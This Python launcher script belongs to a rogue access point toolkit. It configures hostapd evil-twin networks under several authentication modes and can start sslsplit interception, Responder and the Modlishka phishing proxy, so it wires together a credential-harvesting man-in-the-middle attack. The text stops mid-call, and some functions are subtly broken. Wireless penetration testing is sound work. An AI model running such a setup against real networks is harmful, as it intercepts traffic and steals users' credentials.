#!/usr/bin/python3
import os
import _thread
import time
import subprocess
import select
from netaddr import IPAddress
import netifaces

import config
from core.libs import utils
from core.libs import options as Options
from core.libs import conf_manager
from core.libs import cert_wizard

class rogueClass():

    @staticmethod
    def rogue_shutdown(options):
        ##### Ending Program #####

        # kill daemons
        utils.Hostapd.kill()
        utils.IscDhcpServer.stop()

        if (options['auth'] == 'wpa-enterprise'):
            utils.Freeradius.kill()

        if(options['internet']):
            print("[*] Disabling IP forwarding")
            utils.set_ipforward(0)

        if(options['sslsplit']):
            utils.Sslsplit.kill()

        if(options['responder']):
            utils.Responder.kill_by_name('Responder')
            print("[+] Restoring default responder configuration")
            conf_manager.responder_default_conf.configure(do_not_respond_to_own_ip_addr='')
        else:
            pass

        if(options['modlishka']):
            utils.Modlishka.kill()

        rogueClass.iptablesStop()

        if(options['country_code'] != "#country_code=AU"):
            print("[*] Resetting Regulatory Domain")
            utils.set_reg()

        # cleanly allow network manager to regain control of interface
        utils.nmcli.set_managed(options['interface'])

    @staticmethod
    def is_interface_up(interface):
        addr = netifaces.ifaddresses(interface)
        return netifaces.AF_INET in addr

    @staticmethod
    def CatchThread(input, threadType):
        input('Press enter to quit %s...' % threadType)

        input.append(True)

        return

    @staticmethod
    def iptablesStart():
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        return 0

    @staticmethod
    def dhcpiptablesStart():
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.isc_dhcp_server_rules(options['ip_address'], options['interface'], options['secondary_interface'])

        return 0

    @staticmethod
    def sslsplitiptablesStart(sslsplit_encrypted_port):
        utils.Iptables.sslsplit_rules(sslsplit_encrypted_port)

        return 0

    @staticmethod
    def iptablesStop():
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        return 0

    @staticmethod
    def dhcpRoute(ip_address):
        return ", ".join(ip_address.split("."))

    @staticmethod
    def dhcpCidr(dhcp_netmask):
        return IPAddress(dhcp_netmask).netmask_bits()



if __name__ == '__main__':
    print("[*] Launching the rogue toolkit v{}\r\n[-]".format(config.__version__))
    options = Options.set_options()
    if options == 1:
        exit(1)
    if(options['show_options']):
        import types
        print("[+] Options:\r\n[-]   {}\r\n[-]".format(dict(sorted(types.MappingProxyType(options).items()))))

    if options['cert_wizard']:
        cert_wizard.cert_wizard()
        exit(0)
    elif(options['auth'] == 'wpa-enterprise'):
        import os
        try:
            print('[-] Checking required RADIUS certificate files exist...')
            if(not os.path.isfile(options['server_certificate'])):
                print('[!]   \'{}\' does not exist!'.format(options['server_certificate']))
                raise
            if(not os.path.isfile(options['server_private_key'])):
                print('[!]   \'{}\' does not exist!'.format(options['server_private_key']))
                raise
            if(not os.path.isfile(options['ca_certificate'])):
                print('[!]   \'{}\' does not exist!'.format(options['ca_certificate']))
                raise
            if(not os.path.isfile(config.dh_file)):
                print('[!]   \'{}\' does not exist!'.format(config.dh_file))
                print('[-]   creating dh file in location \'{}\''.format(config.certs_dir))
                import os
                os.system('openssl dhparam -check -text -5 1024 -out {}/dh'.format(config.certs_dir))
            print('[-] Check RADIUS certificate files exist passed...')
        except Exception as e:
            print('[!]   Run \'sudo python3 rogue.py --cert-wizard\' command to generate the required certificate files')
            exit(0)
    else:
        pass

    if(options['sslsplit'] and options['cert_nopass']):

        print("[*] Generating a ca.key without a password")
        os.system("openssl rsa -in %s/ca.key -out %s/ca_no_pass.key" % (config.certs_dir, config.certs_dir))
        os.system("openssl req -new -x509 -days 1826 -key %s -out %s" % (config.ca_key, config.ca_crt))

        exit(0)

    else:
        pass

    try: 
        if rogueClass.is_interface_up(options['interface']):
            pass
    except Exception as e:
        print("[!] Interface {} does not exist, {}".format(options['interface'], e))
        exit(1)

    from datetime import datetime
    starttime=datetime.now()
    print("[-] Launching rogue at: {}".format(starttime))
    try:
        utils.nmcli.set_unmanaged(options['interface'])

        if(options['80211_preset_profile'] == 'wifi1'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi1.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask']
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi1.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi1.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi1.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        elif(options['80211_preset_profile'] == 'wifi2'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi2.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask']
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi2.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi2.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi2.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        elif(options['80211_preset_profile'] == 'wifi3'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi3.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask']
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi3.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi3.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi3.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        elif(options['80211_preset_profile'] == 'wifi4'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi4.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi4.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi4.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi4.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        elif(options['80211_preset_profile'] == 'wifi5'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi5.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
